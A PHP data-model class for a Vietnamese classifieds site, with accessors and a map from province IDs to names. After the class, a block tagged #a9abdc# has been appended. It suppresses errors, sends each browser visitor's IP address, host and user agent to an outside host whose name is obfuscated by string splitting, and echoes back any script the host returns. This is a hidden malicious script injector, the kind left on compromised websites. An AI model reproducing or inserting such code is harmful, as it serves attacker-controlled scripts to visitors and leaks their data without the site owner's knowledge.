<?php
class MbRaoVatModel {
	private $id = NULL;
	private $subject = NULL;
	private $catId = NULL;
	private $subCategory = NULL;
	private $type = NULL;
	private $province = NULL;
	private $district = NULL;
	private $content = NULL;
	private $date = NULL;
	private $userId = NULL;
	private $pageView = 0;

	public function getId()
	{
	    return $this->id;
	}

	public function setId($id)
	{
	    $this->id = $id;
	}

	public function getSubject()
	{
	    return $this->subject;
	}

	public function setSubject($subject)
	{
	    $this->subject = $subject;
	}

	public function getCatId()
	{
	    return $this->catId;
	}

	public function setCatId($catId)
	{
	    $this->catId = $catId;
	}

	public function getSubCategory()
	{
	    return $this->subCategory;
	}

	public function setSubCategory($subCategory)
	{
	    $this->subCategory = $subCategory;
	}

	public function getType()
	{
	    return $this->type;
	}

	public function setType($type)
	{
	    $this->type = $type;
	}

	public function getProvince()
	{
	    return $this->province;
	}
	
	public function getProvinceByName() {
		
		$provinces = array( 
		
		"0" => "Toàn quốc",
		       
		"2" => "Hà Nội",

        "3" =>"Hồ Chí Minh",

        "32" => "Hải Phòng",

        "65" => "Đà Nẵng",

        "4" => "An Giang",

        "5" => "Bà Rịa - Vũng Tàu",

        "14" => "Bắc Cạn",
		
        "7" =>"Bắc Giang",

        "12" => "Bạc Liêu",

        "6" => "Bắc Ninh",

        "13" => "Bến Tre",

        "8" => "Bình Dương",

        "10" => "Bình Phước",

        "11" => "Bình Thuận",

        "9" => "Bình Định",

        "66" => "Buôn Mê Thuột",

        "24" => "Cà Mau",

        "15" => "Cần Thơ",

        "25" => "Cao Bằng",

        "26" => "Gia Lai",

        "27" => "Hà Giang",

        "28" => "Hà Nam",

        "29" => "Hà Nội 2",

        "30" => "Hà Tĩnh",

        "31" => "Hải Dương",

        "68" => "Hậu Giang",

        "33" => "Hoà Bình",

        "34" => "Hưng Yên",

        "17" => "Khánh Hòa",

        "35" => "Kiên Giang",

        "36" => "Kon Tum",

        "37" => "Lai Châu",

        "38" => "Lâm Đồng",

        "39" => "Lạng Sơn",

        "20" => "Lào Cai",

        "40" => "Long An",

        "23" => "Nam Định",

        "41" => "Nghệ An",

        "42" => "Ninh Bình",

        "43" => "Ninh Thuận",

        "44" => "Phú Thọ",

        "45" => "Phú Yên",

        "46" => "Quảng Bình",

        "47" => "Quảng Nam",

        "48" => "Quảng Ngãi",

        "21" => "Quảng Ninh",

        "49" => "Quảng Trị",

        "50" => "Sóc Trăng",

        "51" => "Sơn La",

        "52" => "Tây Ninh",

        "53" => "Thái Bình",

        "54" => "Thái Nguyên",

        "55" => "Thanh Hoá",

        "19" => "Thừa Thiên Huế",

        "56" => "Tiền Giang",

        "57" => "Trà Vinh",

        "58" => "Tuyên Quang",

        "59" => "Vĩnh Long",

        "60" => "Vĩnh Phúc",

        "61" => "Yên Bái",

        "69" => "Đà Lạt",

        "62" => "Đắc Lắc",

        "67" => "Đắc Nông",

        "22" => "Đồng Nai",

        "64" => "Đồng Tháp"
        		
		);
		
		if (isset($provinces[$this->getProvince()]))
		
		return $provinces[$this->getProvince()];
		
		else 
		
		return; 
				
	}

	public function setProvince($province)
	{
	    $this->province = $province;
	}

	public function getDistrict()
	{
	    return $this->district;
	}

	public function setDistrict($district)
	{
	    $this->district = $district;
	}

	public function getContent()
	{
	    return $this->content;
	}

	public function setContent($content)
	{
	    $this->content = $content;
	}

	public function getDate()
	{
		//$date = strtotime($this->date);
	    //return //date("d/m/y",$date);
	    return $this->date;
	}

	public function setDate($date)
	{
	    $this->date = $date;
	}

	public function getUserId()
	{
	    return $this->userId;
	}

	public function setUserId($userId)
	{
	    $this->userId = $userId;
	}
	
	public function getPageView()
	{
	    return $this->pageView;
	}

	public function setPageView($pageView)
	{
	    $this->pageView = $pageView;
	}	
}

#a9abdc#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/a9abdc#
